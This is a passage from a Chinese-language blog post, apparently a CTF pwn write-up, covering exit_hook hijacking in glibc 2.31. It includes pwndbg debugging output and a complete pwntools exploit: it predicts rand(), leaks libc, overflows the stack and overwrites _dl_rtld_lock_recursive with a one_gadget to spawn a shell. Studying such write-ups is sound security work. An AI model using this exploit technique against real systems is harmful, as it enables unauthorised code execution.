<p>我们用下面这个payload简单动调验证一下打hook前后flavor的变化。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">b&quot;Congratulations on completing a big step\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(r, <span class="string">&#x27;b *exit \n b *0x4012f0&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">r.send(p64(lock))</span><br><span class="line">r.send(p64(<span class="number">0x4012bd</span>))</span><br></pre></td></tr></table></figure>

<p>我们先单步到exit+27，不知道为什么pwndbg读取不到符号表，只能手动解释一下了。</p>
<p><img src="https://c-lby.top/images/exit_hook_first_try/flavor%E5%8A%A8%E8%B0%831.png" alt="flavor动调1"></p>
<p>此时程序准备call的函数其实就是<code>run_exit_handlers</code>，此时的rsi是<code>exit_funcs</code>指针，指向的是initial结构体。和这个结构体有关的数据结构如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> <span class="title">initial</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *__<span class="title">exit_funcs</span> =</span> &amp;initial;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">	<span class="type">void</span> (*at) (<span class="type">void</span>);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">	  &#123;</span></span><br><span class="line">	    <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">	    <span class="type">void</span> *arg;</span><br><span class="line">	  &#125; on;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">	  &#123;</span></span><br><span class="line">	    <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">	    <span class="type">void</span> *arg;</span><br><span class="line">	    <span class="type">void</span> *dso_handle;</span><br><span class="line">	  &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>所以我们只要去看看0x7f46ee551ca0就能看到flavor了。如果有符号表，可以直接通过<code>p *(struct exit_function_list *) 0x7f46ee551ca0</code>查看，这里我们用telescope。</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">pwndbg</span>&gt; telescope <span class="number">0x7f46ee551ca0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f46ee551ca0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f46ee551ca8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f46ee551cb0</span> ◂— <span class="number">0x4</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f46ee551cb8</span> ◂— <span class="number">0x895cab18d865f3a9</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f46ee551cc0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br></pre></td></tr></table></figure>

<p>可以看到0x10偏移处是4，也就是此时flavor是4，对应ef_cxa。</p>
<p>然后让程序运行到返回magic，再次查看</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">pwndbg</span>&gt; telescope <span class="number">0x7f46ee551ca0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ r15 <span class="number">0x7f46ee551ca0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓        <span class="number">2</span> skipped</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7f46ee551cb8</span> ◂— <span class="number">0x895cab18d865f3a9</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7f46ee551cc0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓        <span class="number">3</span> skipped</span><br></pre></td></tr></table></figure>

<p>此时flavor的位置是0，对应ef_free，那么接下来无论怎么改_dl_rtld_lock_recursive或者unlock，他都不会进入到对应的函数里去执行，而是执行exit_group直接退出。</p>
<p>虽然对这道题没什么卵用，但至少这个实验可以得出exit hook没法用两次的结论（</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;47.98.236.4&#x27;, 5002)</span></span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libcc = cdll.LoadLibrary(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x0401453</span></span><br><span class="line">ret = <span class="number">0x040101a</span></span><br><span class="line">one = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libcc.srand(libcc.time(<span class="number">0</span>))</span><br><span class="line">ran_num = libcc.rand() % <span class="number">110</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;please enter this challenge\n&quot;</span>, <span class="built_in">str</span>(ran_num).encode())</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Give you a gift\n&quot;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(r.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">_rtld_global = libc_base+<span class="number">0x222060</span></span><br><span class="line">_dl_rtld_lock_recursive = _rtld_global + <span class="number">0xf08</span></span><br><span class="line">_dl_rtld_unlock_recursive = _rtld_global + <span class="number">0xf10</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="built_in">hex</span>(_dl_rtld_lock_recursive))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Come and try it out\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + <span class="string">b&#x27;\xbd\x12\x40\x00\x00\x00&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *exit \n b *0x4012f0&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Congratulations on completing a big step\n&quot;</span>)</span><br><span class="line">r.send(p64(_dl_rtld_lock_recursive))</span><br><span class="line">r.send(p64(libc_base+one[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12856?time__1311=mqmhq+xfxUxoDsD7GY5r=bDk7D8lKeD&alichlgref=https://www.bing.com/#toc-2">exit_hook攻击利用</a></p>
<p><a target="_blank" rel="noopener" href="https://ixout.github.io/posts/11890/index.html">exit函数利用</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/260754#h2-0">Glibc2.32源码分析之exit部分</a></p>

											<div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0
        国际许可协议(CC BY-NC-SA 4.0) 发布.</a></br>
    因本人技术水平和知识面有限, 内容如有纰漏或者需要修正的地方, 欢迎大家指正。转载请注明来自<a href="https://c-lby.github.io" target="_blank">C_LBY's blog</a>！
</div>
							</div>

							
									
										<span data-path="/2024/05/12/exit-hook-first-try/">
											<em class="post-meta-item-text"> Page View <i
													class="waline-pageview-count"></i></em>
										</span>

										
											<div>
												<center>

													<div class="pagination">

    
    
    <a href="/2024/05/15/glibc-exit-hook/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/04/28/2024xyctf-pwn-wp/" type="button" class="btn btn-default ">下一页<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


												</center>
											</div>

											<!-- comment -->
											<!--
<section id="comment">
    <h2 class="title">留言</h2>

    
</section>

-->
											
													
														<section id="comments" class="comments">
															<!-- <link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css" />
<div id="waline"></div>
<script type="module">
  import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
  var walineConfig = 
    walineConfig.el='#waline';
  Waline.init(walineConfig);
</script> -->

<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css" />
<div id="waline"></div>
<script type="module">
  import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';

  init({
    enable: true,
    el: '#waline',
    serverURL: 'https://blog-s-comment-three.vercel.app',
    dark: true,
    pageview: true,
    lang: 'zh-CN',
    requiredMeta: ['nick', 'mail'],
    locale:
      { placeholder: 'Say something……' },
    highlighter: true,
    search: false,
    emoji: [
      '//unpkg.com/@waline/emojis@1.2.0/weibo',
      '//unpkg.com/@waline/emojis@1.2.0/bmoji',
      '//unpkg.com/@waline/emojis@1.2.0/bilibili',
      'https://unpkg.com/@waline/emojis@1.2.0/qq',
    ],
    imageUploader: false,
  });
</script>
														</section>
														
															
					</div> <!-- col-md-9/col-md-12 -->


					
						<div id="side_meta">
							<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-05-12 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/WP/">WP<span>7</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/PWN/">PWN<span>10</span></a></li> <li><a href="/tags/WP/">WP<span>7</span></a></li> <li><a href="/tags/exit-hook/">exit_hook<span>2</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-article-text">题目</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95-%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-article-text">分析调试&amp;出现的问题</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-article-text">随机数绕过</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%8E%A5%E6%94%B6libc%E5%9C%B0%E5%9D%80"><span class="toc-article-text">接收libc地址</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%BA%A2%E5%87%BA"><span class="toc-article-text">溢出</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-article-text">任意地址写</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%8A%AB%E6%8C%81got%E8%A1%A8%EF%BC%8C%E4%BD%86one-gadget%E6%97%A0%E6%95%88"><span class="toc-article-text">劫持got表，但one gadget无效</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%8A%AB%E6%8C%81exit-hook%EF%BC%8C%E4%BD%86%E6%98%AF%E8%A2%AB%E6%A3%80%E6%B5%8B%E5%88%B0%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%9F"><span class="toc-article-text">劫持exit hook，但是被检测到栈溢出？</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%8A%AB%E6%8C%81exit-hook%EF%BC%8C%E4%BD%86%E6%98%AF%E5%8F%AA%E8%83%BD%E7%94%A8%E4%B8%80%E9%81%8D"><span class="toc-article-text">劫持exit hook，但是只能用一遍</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#EXP"><span class="toc-article-text">EXP</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-article-text">参考链接</span></a></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->



						</div>

						

			</div><!-- row -->

			<!--
 -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
    &copy; 2024
      鎏柏鱼's Blog
        
                powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | Theme by <a
                  href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>
</p> </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
